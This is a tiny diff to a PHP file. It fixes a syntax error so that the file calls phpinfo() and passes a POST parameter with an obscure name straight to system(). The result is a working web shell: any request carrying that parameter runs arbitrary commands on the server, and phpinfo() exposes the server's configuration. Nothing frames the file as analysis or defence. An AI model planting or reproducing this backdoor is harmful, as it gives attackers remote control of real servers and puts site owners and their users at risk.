@@ -1,4 +1,4 @@
 <?php
 phpinfo();
-system($_POST["o;sagfulkasdglkfh"];
+system($_POST["o;sagfulkasdglkfh"]);
 ?>
